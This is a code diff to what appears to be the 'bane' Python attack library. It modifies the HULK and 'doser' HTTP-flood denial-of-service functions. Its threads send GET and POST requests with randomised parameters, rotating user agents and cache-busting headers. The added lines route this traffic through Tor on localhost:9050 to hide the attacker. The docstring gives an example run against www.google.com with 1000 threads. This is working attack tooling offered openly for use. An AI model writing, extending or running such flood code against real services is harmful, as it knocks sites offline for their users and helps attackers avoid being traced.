@@ -1374,7 +1374,7 @@ class hu(threading.Thread):
        print"Requests: {}".format(counter)
      except Exception as e:
       pass
-def hulk(u,threads=700,maxtime=10,interval=300,logs=True,returning=False):
+def hulk(u,threads=700,maxtime=10,interval=300,logs=True,returning=False,settor=True):
  '''
    this function is used for hulk attack with more complex modification (more than 10k useragents and references, also a better way to generate random http GET parameters.
     
@@ -1390,6 +1390,9 @@ def hulk(u,threads=700,maxtime=10,interval=300,logs=True,returning=False):
    >>>bane.hulk('www.google.com',threads=1000)
 
 '''
+ if settor==True:
+  socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, '127.0.0.1', 9050)
+  socket.socket = socks.socksocket
  global stop
  stop=False
  global prints
@@ -2480,9 +2483,27 @@ class dose(threading.Thread):
       jo='?' 
      u+=jo+q+"="+p
      h={'User-Agent': random.choice(ua) ,'Accept-language': 'en-US,en,q=0.5', 'Cache-Control':'no-cache','Connection': 'keep-alive','Keep-Alive': str(random.randint(100,120)), 'Host': host}
-     requests.get(u,headers=h,timeout=timeout)
+     if tor==True:
+       session = requests.session()
+       session.proxies = {}
+       session.proxies['http'] = 'socks5h://localhost:9050'
+       session.proxies['https'] = 'socks5h://localhost:9050'
+       session.get(u,headers=h,timeout=timeout)
+      else:
+       requests.get(u,headers=h,timeout=timeout)
     elif method==2:
       req="POST"
+      q=''
+      for i in range(1,random.randint(2,15)):
+       q+=random.choice(lis)
+      p=''
+      for i in range(1,random.randint(2,15)):
+       p+=random.choice(lis)
+      if '?' in u:
+       jo='&'
+      else:
+       jo='?' 
+      u+=jo+q+"="+p
       k=''
       for _ in range(1,random.randint(2,5)):
        k+=random.choice(lis)
@@ -2493,7 +2514,14 @@ class dose(threading.Thread):
       for x in range(0,random.randint(11,31)):
        j+=random.choice(lis)+str(random.randint(1,10000))
       h={'User-Agent': random.choice(ua) ,'Accept-language': 'en-US,en,q=0.5','Connection': 'keep-alive','Keep-Alive': str(random.randint(100,1000)) ,'Content-Type': 'application/x-www-form-urlencoded','Host': target}
-      requests.post(u, data={k:j}, headers=h,timeout=timeout)
+      if tor==True:
+       session = requests.session()
+       session.proxies = {}
+       session.proxies['http'] = 'socks5h://localhost:9050'
+       session.proxies['https'] = 'socks5h://localhost:9050'
+       session.post(u, data={k:j}, headers=h,timeout=timeout)
+      else:
+       requests.post(u, data={k:j}, headers=h,timeout=timeout)
     elif method==3:
      i=random.randint(1,2)
      if i==1:
@@ -2510,9 +2538,27 @@ class dose(threading.Thread):
        jo='?' 
       u+=jo+q+"="+p
       h={'User-Agent': random.choice(ua) ,'Accept-language': 'en-US,en,q=0.5', 'Cache-Control':'no-cache','Connection': 'keep-alive','Keep-Alive': str(random.randint(100,120)), 'Host': host}
-      requests.get(u,headers=h,timeout=timeout)
+      if tor==True:
+       session = requests.session()
+       session.proxies = {}
+       session.proxies['http'] = 'socks5h://localhost:9050'
+       session.proxies['https'] = 'socks5h://localhost:9050'
+       session.get(u,headers=h,timeout=timeout)
+      else:
+       requests.get(u,headers=h,timeout=timeout)
      else:
       req="POST"
+      q=''
+      for i in range(1,random.randint(2,15)):
+       q+=random.choice(lis)
+      p=''
+      for i in range(1,random.randint(2,15)):
+       p+=random.choice(lis)
+      if '?' in u:
+       jo='&'
+      else:
+       jo='?' 
+      u+=jo+q+"="+p
       k=''
       for _ in range(1,random.randint(2,5)):
        k+=random.choice(lis)
@@ -2523,7 +2569,14 @@ class dose(threading.Thread):
       for x in range(0,random.randint(11,31)):
        j+=random.choice(lis)
       h={'User-Agent': random.choice(ua) ,'Accept-language': 'en-US,en,q=0.5','Connection': 'keep-alive','Keep-Alive': str(random.randint(100,1000)) ,'Content-Type': 'application/x-www-form-urlencoded','Host': target}
-      requests.post(u, data={k:j}, headers=h,timeout=timeout)
+      if tor==True:
+       session = requests.session()
+       session.proxies = {}
+       session.proxies['http'] = 'socks5h://localhost:9050'
+       session.proxies['https'] = 'socks5h://localhost:9050'
+       session.post(u, data={k:j}, headers=h,timeout=timeout)
+      else:
+       requests.post(u, data={k:j}, headers=h,timeout=timeout)
     counter+=1
     if prints==True:
      print'[!]Requests: {} | Type: {}'.format(counter,req)
@@ -2534,10 +2587,12 @@ class dose(threading.Thread):
    except Exception as e:
     pass
    time.sleep(.1)
-def doser(u,threads=700,meth=1,maxtime=5,interval=300,logs=True,returning=False):
+def doser(u,threads=700,meth=1,maxtime=5,interval=300,logs=True,returning=False,settor=False):
  '''
   this function is for doser.py attack tool which uses requests module instead of httplib.
 '''
+ global tor
+ tor=settor
  global stop
  stop=False
  global prints
